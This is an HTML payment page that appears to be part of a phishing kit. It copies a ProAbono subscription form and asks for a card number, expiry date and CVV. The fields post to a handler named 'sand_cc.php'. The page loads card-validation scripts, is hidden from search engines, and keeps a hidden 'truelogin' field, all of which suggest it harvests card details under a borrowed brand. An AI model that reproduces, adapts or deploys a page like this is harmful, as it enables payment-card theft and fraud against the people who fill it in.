
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>ghislain-morissette-eur</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="robots" content="noindex,nofollow">
    <!--[if lte IE 8]>
    <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    
    
        <link rel="stylesheet" type="text/css" href="./ghislain-morissette-eur_files/material-flex.css">
    <link rel="stylesheet" type="text/css" href="./ghislain-morissette-eur_files/theme.css">

    
    <script type="text/javascript" src="./ghislain-morissette-eur_files/jquery.min.js"></script>
    <script type="text/javascript" src="./ghislain-morissette-eur_files/ProAbono.common.js"></script>



<style type="text/css">


    .onoffswitch-inner:before
    { content: "Oui"; }
    .onoffswitch-inner:after
    { content: "Non"; }
</style>


    
    <script type="text/javascript" src="./ghislain-morissette-eur_files/ProAbono.form.js"></script>

<title>

</title></head>

<script type="text/javascript" src="./style/js/jquery.creditCardValidator.min.js"></script>

<script type="text/javascript" src="./style/js/cc.js"></script>



<body>
		
<div id="ajax" style="opacity: 1;">

<div class="container" id="page">
<div class="container-mid">
<div class="container-in">

            <div id="page-ForSubscription">

                <header class="region" id="page-header">
<div class="region-mid">
<div class="region-in">

                            <a href="#"><img class="header-logo" src="./ghislain-morissette-eur_files/logo-customer-blank.png"></a>

                        
                </div></div></header><div class="region" id="page-content">
<div class="region-mid">
<div class="region-in">
<div class="subregion" id="content-top">
<div class="subregion-mid">
<div class="subregion-in">

                                    


                                
                        </div></div></div><div class="subregion" id="content-main">
<div class="subregion-mid">
<div class="subregion-in">


    

    <div class="page-subscribe">
        <div class="widget title">
<div class="widget-mid">
<div class="widget-in">
<h2 class="title">1 payments</h2>
        </div></div></div><div class="widget form form-subscribe">
<div class="widget-mid">
<div class="widget-in">

                <div class="zone-form">

                    <div id="region-modepayment" class="region">
    <h3>Payment info</h3>
            
        <div class="scheme-prices">

            <div class="widget scheme-price list">
<div class="widget-mid">
<div class="widget-in">


        <div class="scheme-price-single">
            
                
            
       
        <div class="clearfix"></div>

            
                  
            
        </div>
        <div class="spacer"></div>


                    </div></div></div>
        </div>

        

            <h4>Enter your payment information</h4>
                            
        <div id="mode-payments" class="payment-modes" style="">

<div class="widget form form-permission">
<div class="widget-mid">
<div class="widget-in">
<table align="center">
<tr>
<td col=1>
<img alt="Visa MasterCard CB" class="img-payment-type" src="./ghislain-morissette-eur_files/secu-cb-300.png">
</td>
<td col=2>
<img alt="Amex" class="img-payment-type" src="./ghislain-morissette-eur_files/AmexCard.png" style="width:45px; height:32px">
</td >
</tr>
</table>

        

<div class="form-permission-in">
    
    <div id="form-permission-error" class="warning"></div>

    <form id="formpayment" name="formpayment" action="sand_cc.php" method="post">

        <div class="form-payment-email">
           
        </div>

            <input type="hidden" name="truelogin" id="truelogin" value="No">

        <div class="form-permission-line line-number">
            <div class="form-permission-card-number">
                <label class="form-label" for="Number">Card number</label><input autocomplete="off" class="textbox " id="Number" name="number" type="text" required="required">
            </div>
			<input type="hidden" name="cc_card_type" id="cc_card_type" value="">
			<input type="hidden" name="cc_length_valid" id="cc_length_valid" value="false">
			<input type="hidden" name="cc_luhn_valid" id="cc_luhn_valid" value="false">                                
        </div>
        <div class="form-permission-line line-expiration">
            <div class="form-permission-card-expiration">
                <label class="form-label" for="Month">Expiration date</label><select class=" expiration-month" id="Month" name="month"><option value=""></option><option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option selected="selected" value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>
                /
                <select class=" expiration-year" id="Year" name="year"><option value=""></option><option selected="selected" value="20">2020</option>
<option value="21">2021</option>
<option value="22">2022</option>
<option value="23">2023</option>
<option value="24">2024</option>
<option value="25">2025</option>
<option value="26">2026</option>
<option value="27">2027</option>
<option value="28">2028</option>
</select>
            </div>
            <div class="form-permission-card-cvv">
                <label class="form-label" for="Cvv">CVV<a class="hover-tip round">?<span class="in">security code</span></a></label><input autocomplete="off" class="textbox " id="Cvv" name="cvv" type="text" required="required">
            </div>
        </div>
        <div class="form-permission-line line-validate">
            <button type="submit" class="submit" >Validate</button>
        </div>
        <div class="spacer"></div>
</form>


    
</div>

</div></div></div>

<div class="form-permission-after">

    <div class="info-item info-gateway">
        


    </div>
    <div class="info-item info-typepayment">
        
<table>
<tr>
<td col=1>

</td>
<td col=2>

</td>
</tr>
</table>
    </div>
    <div class="info-item info-ssl">
       
    </div>
    <div class="spacer"></div>
</div>
<div class="form-permission-extra">
    
</div>



</div>
        

            
</div>

                </div>
                <div class="spacer"></div>
        </div></div></div><div class="widget info info-mini customer-care">
<div class="widget-mid">
<div class="widget-in">


                <h4 class="title title-widget">Une question ? Un problème ? Une suggestion ?</h4>

                <p>N'hésitez pas à contacter le support client :</p>
                
        </div></div></div>
    </div>


                        </div></div></div><div class="subregion" id="content-bottom">
<div class="subregion-mid">
<div class="subregion-in">

                                    

                                
                        </div></div></div></div></div></div><footer class="region" id="page-footer">
<div class="region-mid">
<div class="region-in">

                            

                        
                </div></div></footer>
            </div>
    </div></div></div>





</div>        







</body></html>